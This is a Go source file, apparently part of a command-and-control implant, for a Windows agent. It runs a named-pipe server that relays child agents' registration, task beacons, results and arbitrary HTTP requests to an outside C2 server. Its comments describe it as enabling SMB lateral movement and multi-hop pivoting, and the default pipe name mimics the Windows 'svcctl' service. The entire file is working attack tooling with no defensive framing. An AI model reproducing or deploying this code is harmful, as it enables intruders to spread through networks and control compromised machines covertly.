//go:build windows

package agent

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

const (
	pipeAccessDuplex      = 0x00000003
	pipeTypeByte          = 0x00000000
	pipeWait              = 0x00000000
	pipeUnlimitedInst     = 255
	pipeBufSize           = 65536
	invalidHandle         = ^uintptr(0)
)

var (
	procCreateNamedPipeW    = syscall.NewLazyDLL("kernel32.dll").NewProc("CreateNamedPipeW")
	procConnectNamedPipe    = syscall.NewLazyDLL("kernel32.dll").NewProc("ConnectNamedPipe")
	procDisconnectNamedPipe = syscall.NewLazyDLL("kernel32.dll").NewProc("DisconnectNamedPipe")
	procCancelIoEx          = syscall.NewLazyDLL("kernel32.dll").NewProc("CancelIoEx")
)

type pipeSession struct {
	agentID string
	aesKey  []byte
}

// pipeServer listens on a named pipe and relays child agent traffic to the C2 server.
// This enables SMB-based lateral movement through an existing agent.
type pipeServer struct {
	pipeName  string
	serverURL string
	client    *http.Client
	sessions  sync.Map // agentID → *pipeSession
	stop      chan struct{}
	once      sync.Once
	mu        sync.Mutex
	lh        syscall.Handle // current blocking accept handle (0 = none)
}

var (
	globalPS   *pipeServer
	globalPSMu sync.Mutex
)

func startPipeServer(pipeName string) error {
	if pipeName == "" {
		pipeName = `\\.\pipe\svcctl`
	} else if len(pipeName) < 9 || pipeName[:9] != `\\.\pipe\` {
		pipeName = `\\.\pipe\` + pipeName
	}
	globalPSMu.Lock()
	defer globalPSMu.Unlock()
	if globalPS != nil {
		return fmt.Errorf("pipe server already running on %s", globalPS.pipeName)
	}
	tr := &http.Transport{}
	if ProxyURL != "" {
		if pu, err := url.Parse(ProxyURL); err == nil {
			tr.Proxy = http.ProxyURL(pu)
		}
	}
	ps := &pipeServer{
		pipeName:  pipeName,
		serverURL: ServerURL,
		client:    &http.Client{Transport: tr, Timeout: 30 * time.Second},
		stop:      make(chan struct{}),
	}
	globalPS = ps
	go ps.run()
	return nil
}

func stopPipeServer() string {
	globalPSMu.Lock()
	defer globalPSMu.Unlock()
	if globalPS == nil {
		return "no pipe server running"
	}
	ps := globalPS
	globalPS = nil
	ps.once.Do(func() {
		close(ps.stop)
		// CancelIoEx unblocks the blocking ConnectNamedPipe call
		ps.mu.Lock()
		if ps.lh != 0 {
			procCancelIoEx.Call(uintptr(ps.lh), 0)
		}
		ps.mu.Unlock()
	})
	return fmt.Sprintf("[+] pipe server on %s stopped", ps.pipeName)
}

func (ps *pipeServer) run() {
	for {
		select {
		case <-ps.stop:
			return
		default:
		}

		pipeW, err := syscall.UTF16PtrFromString(ps.pipeName)
		if err != nil {
			return
		}
		h, _, _ := procCreateNamedPipeW.Call(
			uintptr(unsafe.Pointer(pipeW)),
			uintptr(pipeAccessDuplex),
			uintptr(pipeTypeByte|pipeWait),
			uintptr(pipeUnlimitedInst),
			uintptr(pipeBufSize),
			uintptr(pipeBufSize),
			0, 0,
		)
		if h == invalidHandle {
			time.Sleep(500 * time.Millisecond)
			continue
		}

		ps.mu.Lock()
		ps.lh = syscall.Handle(h)
		ps.mu.Unlock()

		ret, _, lastErr := procConnectNamedPipe.Call(h, 0)

		ps.mu.Lock()
		ps.lh = 0
		ps.mu.Unlock()

		select {
		case <-ps.stop:
			syscall.CloseHandle(syscall.Handle(h))
			return
		default:
		}

		// ERROR_PIPE_CONNECTED (535): client connected before ConnectNamedPipe was called.
		// Windows returns 0 in that case but the pipe IS connected — treat as success.
		const errPipeConnected = syscall.Errno(535)
		if ret == 0 && lastErr != errPipeConnected {
			syscall.CloseHandle(syscall.Handle(h))
			continue
		}

		go ps.handleConn(&pipeConn{handle: syscall.Handle(h)})
	}
}

func (ps *pipeServer) handleConn(conn *pipeConn) {
	defer conn.Close()

	msg, err := pipeReadMsg(conn)
	if err != nil {
		return
	}
	var first map[string]interface{}
	if err := json.Unmarshal(msg, &first); err != nil {
		return
	}
	if first["type"] != "REGISTER" {
		return
	}

	regBody, _ := json.Marshal(map[string]interface{}{
		"hostname":  first["hostname"],
		"username":  first["username"],
		"os":        first["os"],
		"pid":       first["pid"],
		"transport": "smb",
	})
	status, regRespRaw, err := ps.doRequest("POST", "/register", regBody)
	if err != nil || status != http.StatusOK {
		return
	}

	var regResp registerResponse
	if err := json.Unmarshal(regRespRaw, &regResp); err != nil {
		return
	}
	aesKey, err := base64.StdEncoding.DecodeString(regResp.AESKey)
	if err != nil {
		return
	}
	sess := &pipeSession{agentID: regResp.AgentID, aesKey: aesKey}
	ps.sessions.Store(regResp.AgentID, sess)
	defer ps.sessions.Delete(regResp.AgentID)

	if err := pipeWriteMsg(conn, regRespRaw); err != nil {
		return
	}

	for {
		msg, err := pipeReadMsg(conn)
		if err != nil {
			return
		}
		var req map[string]interface{}
		if err := json.Unmarshal(msg, &req); err != nil {
			return
		}
		switch req["type"] {
		case "BEACON":
			ps.relayBeacon(conn, sess)
		case "RESULT":
			ps.relayResult(sess, req)
		case "RELAY":
			// N-hop pivot: child asks us to forward an arbitrary HTTP request to C2
			ps.handleRelay(conn, req)
		}
	}
}

// doRequest forwards an HTTP request to the C2, using rawForward if available
// (N-hop: this pivot is itself an SMB agent behind another pivot).
func (ps *pipeServer) doRequest(method, path string, body []byte) (int, []byte, error) {
	if rf, ok := activeTransport.(rawForwarder); ok {
		return rf.rawForward(method, path, body)
	}
	var bodyReader io.Reader
	if len(body) > 0 {
		bodyReader = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, ps.serverURL+path, bodyReader)
	if err != nil {
		return 0, nil, err
	}
	if method == "POST" && len(body) > 0 {
		if len(body) > 2 && body[0] == '{' {
			req.Header.Set("Content-Type", "application/json")
		} else {
			req.Header.Set("Content-Type", "application/octet-stream")
		}
	}
	resp, err := ps.client.Do(req)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, b, nil
}

func (ps *pipeServer) relayBeacon(conn *pipeConn, sess *pipeSession) {
	status, encrypted, err := ps.doRequest("GET", "/beacon/"+sess.agentID, nil)
	if err != nil || status == http.StatusNoContent {
		pipeWriteMsg(conn, []byte("null"))
		return
	}
	if status != http.StatusOK {
		pipeWriteMsg(conn, []byte("null"))
		return
	}
	plaintext, err := open(sess.aesKey, encrypted)
	if err != nil {
		pipeWriteMsg(conn, []byte("null"))
		return
	}
	var br beaconResponse
	json.Unmarshal(plaintext, &br)
	tasks, _ := json.Marshal(br.Tasks)
	pipeWriteMsg(conn, tasks)
}

func (ps *pipeServer) relayResult(sess *pipeSession, req map[string]interface{}) {
	taskID, _ := req["task_id"].(float64)
	output, _ := req["output"].(string)
	errStr, _ := req["error"].(string)
	plaintext, _ := json.Marshal(resultRequest{
		TaskID: int64(taskID),
		Output: output,
		Error:  errStr,
	})
	encrypted, err := seal(sess.aesKey, plaintext)
	if err != nil {
		return
	}
	ps.doRequest("POST", "/result/"+sess.agentID, encrypted)
}

// handleRelay processes RELAY requests from children — enables N-hop pivot chaining.
// The child sends: {"type":"RELAY","method":"GET","path":"/beacon/...","body_b64":"..."}
// We forward via doRequest (which itself may use rawForward if we're behind another pivot).
func (ps *pipeServer) handleRelay(conn *pipeConn, req map[string]interface{}) {
	method, _ := req["method"].(string)
	path, _ := req["path"].(string)
	bodyB64, _ := req["body_b64"].(string)
	body, _ := base64.StdEncoding.DecodeString(bodyB64)

	status, respBody, err := ps.doRequest(method, path, body)
	if err != nil {
		resp, _ := json.Marshal(map[string]interface{}{"status": 502, "body_b64": ""})
		pipeWriteMsg(conn, resp)
		return
	}
	resp, _ := json.Marshal(map[string]interface{}{
		"status":   status,
		"body_b64": base64.StdEncoding.EncodeToString(respBody),
	})
	pipeWriteMsg(conn, resp)
}
